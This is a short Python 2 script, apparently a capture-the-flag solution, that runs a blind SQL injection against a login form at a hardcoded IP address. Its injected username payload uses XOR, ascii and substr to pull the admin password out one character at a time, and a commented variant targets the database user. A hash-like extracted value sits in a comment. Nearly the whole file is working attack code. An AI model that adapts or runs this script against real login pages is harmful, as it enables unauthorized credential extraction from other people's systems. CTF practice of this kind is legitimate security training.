import requests as rs
import re


def test(name):
    url = "http://118.89.219.210:49167/index.php"
    data = {
        'username':name,
        'password':'skctf123456'
    }
    r1 = rs.post(url,data=data)
    print r1.text
    r2 = re.findall("<p align='center'>(.*)</p></font> ",r1.text)
    print r2


def flag():
    rr = rs.session()
    url = "http://118.89.219.210:49167/index.php"
    key= ''
    for j in xrange(1,300):
        k = 0
        for i in xrange(36,130):
            data = {
                'username':  "admin'^(ascii(substr((password)from("+str(j)+")))-"+str(i)+")#",
                # 'username': "admin'^(ascii(substr((user())from(" + str(j) + ")))-" + str(i) + ")#",
                'password': ''
            }
            r1 = rr.post(url, data=data)
            if "password error" in r1.text:
                # print chr(i)
                key+=chr(i)
                print " "+key
                k = 1
                break
            # else:
            #     print '-',
        if k==0:
            break




# 51b7a76d51e70b419f60d3473fb6f900

if __name__=='__main__':
    name = "admin"
    # test(name)
    flag()


